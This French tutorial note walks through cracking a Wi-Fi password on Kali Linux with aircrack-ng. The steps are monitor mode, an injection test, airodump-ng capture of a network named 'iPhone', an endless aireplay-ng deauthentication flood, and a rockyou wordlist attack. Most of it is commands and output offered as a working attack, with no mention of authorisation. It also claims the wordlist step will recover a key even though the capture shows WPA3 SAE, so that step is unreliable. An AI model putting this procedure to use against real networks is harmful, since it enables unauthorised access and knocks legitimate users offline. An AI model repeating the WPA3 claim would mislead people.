---
{"dg-publish":true,"permalink":"/mes-notes/kali/cracker-un-wi-fi/"}
---

Pour commencer nous allons prendre notre VM kali sur la quelle nous allons plug une carte wifi externe qui accepte le mode monitor (pour ma part c'est une ALFA AWUS036NNHA).

Une fois plug à nôtre kali nous pouvons nous assurez quelle est bien détecté par le système avec la commande `<lsusb>` :
```Shell
┌──(kali㉿kali)-[~]
└─$ lsusb
Bus 002 Device 002: ID 0cf3:9271 Qualcomm Atheros Communications AR9271 802.11n
Bus 002 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
Bus 001 Device 003: ID 0e0f:0002 VMware, Inc. Virtual USB Hub
Bus 001 Device 002: ID 0e0f:0003 VMware, Inc. Virtual Mouse
Bus 001 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
```

Pour moi c'est la première, elle apparaît sous le nom de : "Qualcomm Atheros Communications AR9271 802.11".

Avec la commande `<iwconfig>` nous pouvons voir le mode actuel de la carte (elle nous permet également de voir le nom de l'interface) :
```Shell
┌──(kali㉿kali)-[~]
└─$ iwconfig 
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off

```

Nous allons arrêtez la carte puis stop tout precessus qui utilise la carte (il est important d'être root pour utiliser la suite aircrack-ng) : 
```Shell
┌──(kali㉿kali)-[~]
└─$ sudo -s
[sudo] Mot de passe de kali : 
┌──(root㉿kali)-[/home/kali]
└─# ifconfig wlan0 down
   
┌──(root㉿kali)-[/home/kali]
└─# airmon-ng check kill

Killing these processes:

    PID Name
   2370 wpa_supplicant
```

Ensuite nous mettons la certe en mode monitor et nous redémarrons la carte :
```Shell
┌──(root㉿kali)-[/home/kali]
└─# iwconfig wlan0 mode monitor
   
┌──(root㉿kali)-[/home/kali]
└─# iwconfig                   
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off

┌──(root㉿kali)-[/home/kali]
└─# ifconfig wlan0 up
```

Maintenant nousallons faire un test d'injection de paquets :
```Shell
┌──(root㉿kali)-[/home/kali]
└─# aireplay-ng --test wlan0
20:10:38  Trying broadcast probe requests...
20:10:38  Injection is working!
20:10:40  Found 4 APs

20:10:40  Trying directed probe requests...
20:10:40  **:19:**:AA:**:40 - channel: 1 - 'SFR_****'
20:10:41  Ping (min/avg/max): 3.545ms/32.508ms/84.305ms Power: -49.17
20:10:41  30/30: 100%

20:10:41  **:0C:6B:**:**:8E - channel: 1 - 'SFR_****'
20:10:43  Ping (min/avg/max): 1.582ms/39.841ms/198.426ms Power: -86.96
20:10:43  28/30:  93%

20:10:43  **:2D:1B:**:39:** - channel: 1 - 'SFR_****'
20:10:47  Ping (min/avg/max): 5.082ms/22.694ms/46.298ms Power: -87.00
20:10:47   9/30:  30%

20:10:47  0E:87:AC:76:E8:0B - channel: 6 - 'iPhone'
20:10:49  Ping (min/avg/max): 1.476ms/22.612ms/98.443ms Power: -23.32
20:10:49  28/30:  93%
```

Ici le réseau qui nous intéresse est le réseau "iPhone". Nous lancerons donc notre attaques sur l'adesse MAC suivante : 0E:87:AC:76:E8:0B.

Vu que nous connaissons l'adresse de MAC du réseau nous pouvons déjà nous concentrer sur le réseau voulu.
Nous allons donc pouvoir lancer une capture de trafic avec airodump-ng.
```Shell
┌──(root㉿kali)-[/home/kali]
└─# airodump-ng -w capture-trafic -c 6 --bssid 0E:87:AC:76:E8:0B wlan0
CH  6 ][ Elapsed: 1 min ][ 2023-10-27 21:09                                
 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AU 
 
 0E:87:AC:76:E8:0B  -21  75      789        1    0   6  130   WPA3 CCMP   SA 
 
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes   
    
 0E:87:AC:76:E8:0B  96:BE:CF:0C:6F:E3  -40    0 -24      0      416
``` 
Dans cette commande le `<-w>` déclare que le fichier "out" serra capture-trafic, le `<-c>` déclare le channel qu'utilise le réseau utilisateur et le `<--bssid>` déclare l'adresse MAC visée. `<wlan0>` est pour l'interface de al carte wifi.
En parrallèle nous lançons des requètes de deauth :
```Shell
┌──(root㉿kali)-[/home/kali]
└─# aireplay-ng --deauth 0 -a 0E:87:AC:76:E8:0B wlan0
21:08:55  Waiting for beacon frame (BSSID: 0E:87:AC:76:E8:0B) on channel 6
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
21:08:55  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:08:56  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:08:56  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:08:57  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:08:57  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:08:58  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:08:58  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:08:59  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:08:59  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:09:00  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:09:00  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:09:01  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:09:01  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:09:02  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
21:09:02  Sending DeAuth (code 7) to broadcast -- BSSID: [0E:87:AC:76:E8:0B]
```
Le `<-0>` est pour dire que nous voulions des requètes de deauth à l'infini. 

Une fois la capture terminé nous pouvons l'examiner avec aircrack-ng.
```Shell
┌──(root㉿kali)-[/home/kali]
└─# aircrack-ng capture-trafic-01.cap -w /usr/share/wordlists/rockyou.txt
```

Si le mot de passe est dans la wordlist aircrack-ng vous affichera une notification avec écrit "KEY FOUND" et ce message serra suivi du mot de passe.